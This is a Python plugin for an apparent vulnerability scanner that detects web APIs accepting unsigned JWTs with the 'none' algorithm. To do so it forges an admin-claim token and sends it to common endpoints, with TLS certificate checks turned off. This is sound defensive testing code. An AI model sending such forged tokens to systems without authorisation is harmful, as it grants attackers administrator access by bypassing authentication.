"""
Plugin 1125: JWT None Algorithm Detection
===========================================
Detects JWT implementations that accept the "none" algorithm.
In vulnerable JWT libraries, changing the alg header to "none"
bypasses signature verification entirely.
"""
import asyncio
import base64
import json
import ssl

from plugins import NaslPlugin, PluginResult


class JwtNoneAlgorithm(NaslPlugin):
    PLUGIN_ID = 1125
    NAME = 'JWT None Algorithm Detection'
    FAMILY = 'Web Applications'
    CVSS_SCORE = 9.1
    DESCRIPTION = (
        'Detects JWT implementations that accept the "none" algorithm. In '
        'vulnerable JWT libraries, changing the alg header to "none" bypasses '
        'signature verification entirely. An attacker can forge arbitrary tokens '
        'with any claims. CVE-2015-9235 affects jsonwebtoken library and similar '
        'implementations.'
    )
    SOLUTION = (
        'Use JWT libraries that reject "none" algorithm. Validate algorithm '
        'against a whitelist. Use RS256/ES256 asymmetric algorithms.'
    )
    CVE = ['CVE-2015-9235', 'CVE-2016-5431']
    PORTS = [80, 443, 8080, 8443]

    ENDPOINTS = [
        '/api', '/api/v1', '/api/user', '/api/users', '/login',
        '/auth', '/token', '/api/token', '/graphql', '/api/graphql',
    ]

    def _b64encode(self, data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

    def _make_none_jwt(self, payload_claims: dict) -> str:
        header = {'alg': 'none', 'typ': 'JWT'}
        header_b64 = self._b64encode(json.dumps(header).encode())
        payload_b64 = self._b64encode(json.dumps(payload_claims).encode())
        return f'{header_b64}.{payload_b64}.'

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []

        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = 'https' if port_to_check in (443, 8443) else 'http'
                ctx = None
                if scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE

                host_header = target
                if target in ('127.0.0.1', 'localhost', '::1'):
                    host_header = 'alieninc.tech'

                for endpoint in self.ENDPOINTS:
                    forged_jwt = self._make_none_jwt({
                        'sub': 'admin',
                        'role': 'admin',
                        'iat': 1516239022,
                        'exp': 9999999999,
                    })

                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(target, port_to_check, ssl=ctx),
                        timeout=5
                    )

                    req = (
                        f'GET {endpoint} HTTP/1.1\r\n'
                        f'Host: {host_header}\r\n'
                        f'Authorization: Bearer {forged_jwt}\r\n'
                        f'User-Agent: Centra/1.0\r\n'
                        f'Connection: close\r\n\r\n'
                    )
                    writer.write(req.encode())
                    await writer.drain()

                    response = b''
                    try:
                        while True:
                            chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                            if not chunk:
                                break
                            response += chunk
                            if len(response) > 16384:
                                break
                    except asyncio.TimeoutError:
                        pass

                    writer.close()
                    await writer.wait_closed()

                    header_section = response.split(b'\r\n\r\n')[0].decode('utf-8', errors='ignore')
                    body_section = response.split(b'\r\n\r\n', 1)
                    body_text = body_section[1].decode('utf-8', errors='ignore') if len(body_section) > 1 else ''

                    status_code = 0
                    for line in header_section.split('\r\n'):
                        if line.startswith('HTTP/'):
                            try:
                                status_code = int(line.split(' ')[1])
                            except (IndexError, ValueError):
                                pass
                            break

                    if status_code in (200, 201, 204):
                        results.append(PluginResult(
                            vulnerable=True,
                            target=target,
                            port=port_to_check,
                            cvss_score=self.CVSS_SCORE,
                            severity='critical',
                            description=f'JWT "none" algorithm accepted at {endpoint}',
                            solution=self.SOLUTION,
                            evidence=f'Endpoint: {endpoint}, HTTP {status_code} returned with alg=none token',
                            references=[
                                'https://nvd.nist.gov/vuln/detail/CVE-2015-9235',
                                'https://nvd.nist.gov/vuln/detail/CVE-2016-5431',
                                'https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/',
                            ]
                        ))
                        break

            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                pass

        if not results:
            results.append(PluginResult(
                vulnerable=False, target=target, port=port or 0,
                description='JWT "none" algorithm not accepted on checked endpoints'
            ))

        return results
